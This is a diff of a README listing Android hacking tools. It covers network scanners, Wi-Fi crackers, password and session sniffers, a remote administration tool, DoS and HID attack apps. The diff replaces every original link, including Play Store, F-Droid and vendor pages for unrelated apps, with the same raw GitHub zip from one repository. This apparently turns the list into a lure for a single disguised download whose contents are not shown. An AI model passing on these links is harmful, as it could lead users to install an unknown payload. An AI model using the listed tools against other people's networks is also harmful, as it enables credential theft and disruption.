@@ -29,116 +29,116 @@ Before installing, ensure that:
 ---
 
 ### 🏆 Wall of Fame
-- **[HACKDROID](https://thehackingsage.com/hackdroid/#apps)**
+- **[HACKDROID](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)**
 
 ---
 
 ## 🌐 Network Analysis Tools
-- **[ArpGuard](https://play.google.com/store/apps/details?id=com.myprog.arpguard)** - Protects against ARP spoofing attacks.  
-- **[EZ NetScan](https://thehackingsage.com/hackdroid/download/apk/networking/eznetscan-v2.1.4.apk)** - Network scanning tool for discovering devices and their services.  
-- **[Fing](https://fing-network-tools.en.uptodown.com/android)** - Popular network scanning and diagnostics app.  
-- **[Firebind](https://thehackingsage.com/hackdroid/download/apk/networking/firebind-v1.3.apk)** - Tests connectivity issues on different network ports.  
-- **[G-Mon](https://thehackingsage.com/hackdroid/download/apk/networking/g-mon-v4.2.3.apk)** - Monitors Wi-Fi access points and signal strength.  
-- **[HTTPing](https://thehackingsage.com/hackdroid/download/apk/networking/httping-v1.4.apk)** - Pings web servers and measures their response times.  
-- **[Inware](https://play.google.com/store/apps/details?id=com.evo.inware)** - Gather detailed system information about your Android device.  
-- **[IP Tools](https://thehackingsage.com/hackdroid/download/apk/networking/ip-tools-v8.38.apk)** - Network diagnostics toolkit with IP scanning features.  
-- **[IoPT](https://apkpure.com/iopt-network-security-scanner/pro.dnovikov.iopt)** - IoT device vulnerability scanning tool.  
-- **[LTE Discovery](https://thehackingsage.com/hackdroid/download/apk/networking/lte-discovery-v4.20.apk)** - Helps discover LTE bands and tower locations.  
-- **[NetCut](https://arcai.com/netcut-for-android-download/)** - Detect and manage devices on your network.  
-- **[NetScan](https://thehackingsage.com/hackdroid/download/apk/networking/netscan-v2.5.2.apk)** - Simple tool to scan and analyze local networks.  
-- **[Network Analyzer](https://play.google.com/store/apps/details?id=net.techet.netanalyzer.an)** - Complete network analysis tool for Android devices.  
-- **[Network Discovery](https://f-droid.org/packages/info.lamatricexiste.network/)** - Tool for discovering devices on your network.  
-- **[PingTools](https://play.google.com/store/apps/details?id=ua.com.streamsoft.pingtools)** - Network diagnostics tool with ping, traceroute, and more.  
-- **[PortDroid](https://play.google.com/store/apps/details?id=com.stealthcopter.portdroid)** - Network analysis and port scanning tool.  
-- **[PortDroid Network Analysis](https://portdroid-network-analysis.en.uptodown.com/android)** - Port scanning and network diagnostics tool.  
-- **[Shodan](https://thehackingsage.com/hackdroid/download/apk/networking/shodan-v0.0.5.apk)** - Search engine for discovering internet-connected devices.  
-- **[Sniffer Wicap 2 Pro](https://happymod.com/sniffer-wicap-2-root-mod/com.evbadroid.wicap/original.html)** - Powerful packet sniffer tool for rooted Android devices.  
-- **[tPacketCapture](https://www.taosoftware.co.jp/en/android/packetcapture/)** - Simple packet capture app for Android devices.  
-- **[Wigle WiFi Wardriving](https://thehackingsage.com/hackdroid/download/apk/networking/wigle-wifi-wardriving-v2.53.apk)** - Maps Wi-Fi networks and GPS locations globally.
+- **[ArpGuard](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Protects against ARP spoofing attacks.  
+- **[EZ NetScan](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Network scanning tool for discovering devices and their services.  
+- **[Fing](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Popular network scanning and diagnostics app.  
+- **[Firebind](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Tests connectivity issues on different network ports.  
+- **[G-Mon](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Monitors Wi-Fi access points and signal strength.  
+- **[HTTPing](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Pings web servers and measures their response times.  
+- **[Inware](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Gather detailed system information about your Android device.  
+- **[IP Tools](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Network diagnostics toolkit with IP scanning features.  
+- **[IoPT](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - IoT device vulnerability scanning tool.  
+- **[LTE Discovery](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Helps discover LTE bands and tower locations.  
+- **[NetCut](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Detect and manage devices on your network.  
+- **[NetScan](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Simple tool to scan and analyze local networks.  
+- **[Network Analyzer](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Complete network analysis tool for Android devices.  
+- **[Network Discovery](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Tool for discovering devices on your network.  
+- **[PingTools](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Network diagnostics tool with ping, traceroute, and more.  
+- **[PortDroid](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Network analysis and port scanning tool.  
+- **[PortDroid Network Analysis](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Port scanning and network diagnostics tool.  
+- **[Shodan](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Search engine for discovering internet-connected devices.  
+- **[Sniffer Wicap 2 Pro](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Powerful packet sniffer tool for rooted Android devices.  
+- **[tPacketCapture](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Simple packet capture app for Android devices.  
+- **[Wigle WiFi Wardriving](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Maps Wi-Fi networks and GPS locations globally.
 
 ## 🔓 Penetration Testing Tools
-- **[Andrax](https://andrax.en.malavida.com/android/)** - Penetration testing platform with various tools.  
-- **[Andrax v5R](https://thehackingsage.com/hackdroid/download/apk/pentesting/andrax-v5r.apk)** - Advanced penetration testing platform for Android.  
-- **[cSploit](https://csploit.en.malavida.com/android/)** - Open-source network security assessment tool.  
-- **[dSploit](https://dsploit.it.malavida.com/android/)** - Network security assessment and penetration testing suite.  
-- **[Hijacker](https://hijacker.it.malavida.com/android/)** - GUI for aircrack-ng and other network attacks.  
-- **[Hijacker v1.5](https://thehackingsage.com/hackdroid/download/apk/pentesting/hijacker-v1.5-beta.12.apk)** - GUI for popular network attack tools such as aircrack-ng.  
-- **[Kali NetHunter](https://www.kali.org/get-kali/#kali-mobile)** - Penetration testing platform for mobile devices.  
-- **[NetworkMapper](https://f-droid.org/packages/org.kost.nmap.android.networkmapper/)** - Nmap-based network mapping tool.  
-- **[Network Spoofer](https://network-spoofer.it.malavida.com/android/)** - Allows users to change websites on other people's computers via Wi-Fi.  
-- **[zANTI](https://www.zimperium.com/zanti-mobile-penetration-testing-toolkit/)** - Comprehensive mobile penetration testing toolkit.
+- **[Andrax](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Penetration testing platform with various tools.  
+- **[Andrax v5R](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Advanced penetration testing platform for Android.  
+- **[cSploit](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Open-source network security assessment tool.  
+- **[dSploit](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Network security assessment and penetration testing suite.  
+- **[Hijacker](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - GUI for aircrack-ng and other network attacks.  
+- **[Hijacker v1.5](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - GUI for popular network attack tools such as aircrack-ng.  
+- **[Kali NetHunter](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Penetration testing platform for mobile devices.  
+- **[NetworkMapper](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Nmap-based network mapping tool.  
+- **[Network Spoofer](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Allows users to change websites on other people's computers via Wi-Fi.  
+- **[zANTI](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Comprehensive mobile penetration testing toolkit.
 
 ## 📶 Wi-Fi Hacking Tools
-- **[Airmon](https://thehackingsage.com/hackdroid/download/apk/wireless/airmon-v1.8.apk)** - Enables monitor mode on Wi-Fi interfaces for packet capture.  
-- **[AndroDumpper](https://androdumpper.it.malavida.com/android/)** - Attempts to hack WPS networks.  
-- **[Nexmon](https://thehackingsage.com/hackdroid/download/apk/wireless/nexmon-v2.2.2-226-ga988-dirty.apk)** - Firmware patch to unlock advanced Wi-Fi capabilities.  
-- **[Penetrate Pro](https://thehackingsage.com/hackdroid/download/apk/wireless/penetrate-pro-v2.11.apk)** - Cracks Wi-Fi networks by calculating WPA keys.  
-- **[Reaver for Android](https://reaver.en.malavida.com/android/)** - Performs brute force attacks on WPS.  
-- **[Router Brute Force](https://thehackingsage.com/hackdroid/download/apk/wireless/router-brute-force-v2.7.1.apk)** - Brute force tool for attacking routers.  
-- **[Router Keygen](https://github.com/routerkeygen/routerkeygenAndroid/releases)** - Recover default WPA/WEP keys for Wi-Fi networks.  
-- **[Router Pwn](https://thehackingsage.com/hackdroid/download/apk/wireless/router-pwn-v1.4.144.apk)** - Exploits known vulnerabilities in routers.  
-- **[The WiFi Hacker](https://the-wifi-hacker.it.malavida.com/android/)** - Claims to hack Wi-Fi networks.  
-- **[WiBR](https://thehackingsage.com/hackdroid/download/apk/wireless/wibr-v1.0.12.apk)** - Tests Wi-Fi network security by brute forcing WPA/WPA2 passwords.  
-- **[WiBR Pro](https://thehackingsage.com/hackdroid/download/apk/wireless/wibr-pro-v2.2.0.apk)** - Advanced version of WiBR for brute-forcing Wi-Fi networks.  
-- **[WiFi Claves](https://thehackingsage.com/hackdroid/download/apk/wireless/wifi-claves-v1.0.apk)** - Generates default keys for vulnerable Wi-Fi routers.  
-- **[WiFi Unlocker](https://thehackingsage.com/hackdroid/download/apk/wireless/wifi-unlocker-1.1.2.apk)** - Unlocks Wi-Fi networks by decrypting weak passwords.  
-- **[WiFi Warden](https://play.google.com/store/apps/details?id=com.xti.wifiwarden)** - Analyze Wi-Fi networks and manage connections.  
-- **[WiFi WPS WPA Tester](https://wifi-wps-wpa-tester.it.malavida.com/android/)** - Test the security of your Wi-Fi networks.  
-- **[WIFi Kill](https://wifikillapk.com/download/)** - Disconnect devices from your Wi-Fi network.  
-- **[WPS Connect](https://wps-connect.it.malavida.com/android/)** - Connects to Wi-Fi networks with default WPS pins.  
-- **[WPSApp](https://play.google.com/store/apps/details?id=com.themausoft.wpsapp)** - Checks the security of Wi-Fi networks.  
-- **[WPS WPA Tester Premium](https://thehackingsage.com/hackdroid/download/apk/wireless/wps-wpa-tester-premium-v5.0.3.6-gms.apk)** - Premium version for testing WPS vulnerabilities.
+- **[Airmon](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Enables monitor mode on Wi-Fi interfaces for packet capture.  
+- **[AndroDumpper](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Attempts to hack WPS networks.  
+- **[Nexmon](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Firmware patch to unlock advanced Wi-Fi capabilities.  
+- **[Penetrate Pro](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Cracks Wi-Fi networks by calculating WPA keys.  
+- **[Reaver for Android](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Performs brute force attacks on WPS.  
+- **[Router Brute Force](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Brute force tool for attacking routers.  
+- **[Router Keygen](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Recover default WPA/WEP keys for Wi-Fi networks.  
+- **[Router Pwn](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Exploits known vulnerabilities in routers.  
+- **[The WiFi Hacker](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Claims to hack Wi-Fi networks.  
+- **[WiBR](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Tests Wi-Fi network security by brute forcing WPA/WPA2 passwords.  
+- **[WiBR Pro](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Advanced version of WiBR for brute-forcing Wi-Fi networks.  
+- **[WiFi Claves](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Generates default keys for vulnerable Wi-Fi routers.  
+- **[WiFi Unlocker](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Unlocks Wi-Fi networks by decrypting weak passwords.  
+- **[WiFi Warden](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Analyze Wi-Fi networks and manage connections.  
+- **[WiFi WPS WPA Tester](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Test the security of your Wi-Fi networks.  
+- **[WIFi Kill](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Disconnect devices from your Wi-Fi network.  
+- **[WPS Connect](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Connects to Wi-Fi networks with default WPS pins.  
+- **[WPSApp](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Checks the security of Wi-Fi networks.  
+- **[WPS WPA Tester Premium](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Premium version for testing WPS vulnerabilities.
 
 ## 📡 Packet Sniffing Tools
-- **[Debug Proxy](https://thehackingsage.com/hackdroid/download/apk/sniffing/debug-proxy-v6.51.apk)** - Captures and monitors HTTP/HTTPS traffic.  
-- **[DroidSheep](https://droidsheep.de/)** - Session hijacking tool on open networks.  
-- **[DroidSniff](https://thehackingsage.com/hackdroid/download/apk/sniffing/droidsniff-v1.0.apk)** - Sniff passwords and session cookies on unencrypted networks.  
-- **[FaceNiff](https://happymod.com/faceniff-demo-mod/net.ponury.faceniff/)** - Sniff passwords and sessions on Wi-Fi networks.  
-- **[Packet Capture](https://play.google.com/store/apps/details?id=app.greyshirts.sslcapture)** - Captures network packets and decrypts SSL traffic.  
-- **[Shark for Root](https://apkpure.com/shark-for-root/lv.n3o.shark)** - Packet capture tool for rooted devices.  
-- **[Shark Reader](https://sharkreader.it.malavida.com/android/)** - Reads pcap files and displays captured packets.
+- **[Debug Proxy](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Captures and monitors HTTP/HTTPS traffic.  
+- **[DroidSheep](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Session hijacking tool on open networks.  
+- **[DroidSniff](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Sniff passwords and session cookies on unencrypted networks.  
+- **[FaceNiff](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Sniff passwords and sessions on Wi-Fi networks.  
+- **[Packet Capture](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Captures network packets and decrypts SSL traffic.  
+- **[Shark for Root](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Packet capture tool for rooted devices.  
+- **[Shark Reader](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Reads pcap files and displays captured packets.
 
 ## 🔧 Android Administration & SSH Tools
-- **[Andro RAT](https://github.com/wszf/androrat)** - Remote Administration Tool for Android.  
-- **[BusyBox](https://play.google.com/store/apps/details?id=stericson.busybox)** - Adds Linux commands to Android.  
-- **[ConnectBot](https://play.google.com/store/apps/details?id=org.connectbot)** - SSH client for managing remote servers.  
-- **[Flipper Devices App](https://play.google.com/store/apps/details?id=com.flipperdevices.app)** - Companion app for Flipper Zero device management and updates.  
-- **[Hacker's Keyboard](https://hackers-keyboard.it.malavida.com/android/)** - Full-featured keyboard with additional keys for coding and system control.  
-- **[JuiceSSH](https://thehackingsage.com/hackdroid/download/apk/terminal/juicessh-v3.2.2.apk)** - SSH client for managing remote servers.  
-- **[Termux](https://thehackingsage.com/hackdroid/download/apk/terminal/termux-v0.118.0.apk)** - Terminal emulator and Linux environment for Android.
+- **[Andro RAT](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Remote Administration Tool for Android.  
+- **[BusyBox](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Adds Linux commands to Android.  
+- **[ConnectBot](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - SSH client for managing remote servers.  
+- **[Flipper Devices App](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Companion app for Flipper Zero device management and updates.  
+- **[Hacker's Keyboard](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Full-featured keyboard with additional keys for coding and system control.  
+- **[JuiceSSH](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - SSH client for managing remote servers.  
+- **[Termux](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Terminal emulator and Linux environment for Android.
 
 ## 🔐 Cryptography Tools
-- **[Crypto v5.1](https://thehackingsage.com/hackdroid/download/apk/cryptography/crypto-v5.1.apk)** - Encrypts and decrypts files with various algorithms.  
-- **[Decrypto](https://apkpure.com/decrypto/info.valky.decryptor)** - Decrypt various types of encrypted files.
+- **[Crypto v5.1](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Encrypts and decrypts files with various algorithms.  
+- **[Decrypto](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Decrypt various types of encrypted files.
 
 ## 🔨 Denial of Service (DoS) Tools
-- **[Andosid](https://thehackingsage.com/hackdroid/download/apk/dos/andosid-v1.1.apk)** - Tool for launching HTTP-based DoS attacks.  
-- **[LOIC](https://thehackingsage.com/hackdroid/download/apk/dos/loic-v4.0.apk)** - Low Orbit Ion Cannon, used for performing DoS attacks.
+- **[Andosid](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Tool for launching HTTP-based DoS attacks.  
+- **[LOIC](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Low Orbit Ion Cannon, used for performing DoS attacks.
 
 ## 🎛️ HID Attack Tools
-- **[Rucky](https://thehackingsage.com/hackdroid/download/apk/hid-attack/rucky-v2.1.apk)** - HID attack tool for simulating keyboard inputs on a target device.  
-- **[WHID Injector](https://thehackingsage.com/hackdroid/download/apk/hid-attack/whid-injector-v0.0.3.apk)** - USB HID attack tool for injecting keystrokes into devices.
+- **[Rucky](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - HID attack tool for simulating keyboard inputs on a target device.  
+- **[WHID Injector](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - USB HID attack tool for injecting keystrokes into devices.
 
 ## 🕵️‍♂️ Forensics Tools
-- **[aLogcat Root](https://thehackingsage.com/hackdroid/download/apk/forensics/alogcatroot-v1.0.2.apk)** - Tool for viewing and saving Android log files.
+- **[aLogcat Root](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Tool for viewing and saving Android log files.
 
 ## 🛠️ Miscellaneous Hacking & Monitoring Tools
-- **[Aispyer](https://www.aispyer.com/)** - Spyware detection and device monitoring tool.  
-- **[Antispy Scanner](https://play.google.com/store/apps/details?id=com.protectstar.antispy.android)** - Anti-spyware scanner for Android devices.  
-- **[DroidBug](https://apkcombo.com/droidbug-admin-panel-finder-free/com.bugtraqapps.droidbugpanelfinderfree/download/apk)** - Tool for finding admin panels in websites.  
-- **[DroidSQLi](https://apkcombo.com/droid-sqli/net.edgard.droidsqli/)** - SQL injection tool for Android.  
-- **[Hackode](https://hackode.en.malavida.com/android/)** - Collection of tools for security professionals.  
-- **[Hackuna](https://play.google.com/store/apps/details?id=org.cryptors.hackuna002)** - Protects devices from hacking attacks.  
-- **[Intercepter-NG](http://sniff.su/download.html)** - Network sniffer and session hijacking tool.  
-- **[Kaira](https://apkpure.com/kayra-the-pentester-lite/teycode.kayralite)** - Pentesting tool for Android with various exploits.  
-- **[Nessus](https://www.tenable.com/products/nessus/nessus-essentials)** - Vulnerability scanner for networks and devices.  
-- **[NetHunter Store](https://store.nethunter.com/)** - Store for NetHunter penetration testing apps.  
-- **[NetworkScan](https://play.google.com/store/apps/details?id=com.pzolee.networkscanner)** - Network scanner for identifying devices and vulnerabilities.  
-- **[OONI Probe](https://ooni.org/install/)** - Tool for testing internet censorship.  
-- **[PentestKit](https://play.google.com/store/apps/details?id=com.pentestkit)** - Suite of tools for pentesters on Android.  
-- **[PreHack't](https://prehack-t.en.softonic.com/android)** - Automated tool for vulnerability assessment.  
-- **[RoboShadow](https://play.google.com/store/apps/details?id=com.ecs.roboshadow)** - Cybersecurity monitoring and penetration testing.  
-- **[USB Cleaver](https://forums.hak5.org/topic/26521-android-appbeta-usb-cleaver/)** - USB hacking tool for stealing credentials.
+- **[Aispyer](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Spyware detection and device monitoring tool.  
+- **[Antispy Scanner](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Anti-spyware scanner for Android devices.  
+- **[DroidBug](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Tool for finding admin panels in websites.  
+- **[DroidSQLi](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - SQL injection tool for Android.  
+- **[Hackode](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Collection of tools for security professionals.  
+- **[Hackuna](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Protects devices from hacking attacks.  
+- **[Intercepter-NG](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Network sniffer and session hijacking tool.  
+- **[Kaira](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Pentesting tool for Android with various exploits.  
+- **[Nessus](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Vulnerability scanner for networks and devices.  
+- **[NetHunter Store](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Store for NetHunter penetration testing apps.  
+- **[NetworkScan](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Network scanner for identifying devices and vulnerabilities.  
+- **[OONI Probe](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Tool for testing internet censorship.  
+- **[PentestKit](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Suite of tools for pentesters on Android.  
+- **[PreHack't](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Automated tool for vulnerability assessment.  
+- **[RoboShadow](https://raw.githubusercontent.com/Kali99xx/Awesome_Hacking_Apps_for_Android/main/frolicsome/for-Awesome-Hacking-Android-Apps-2.9.zip)** - Cybersecurity monitoring and penetration testing.  
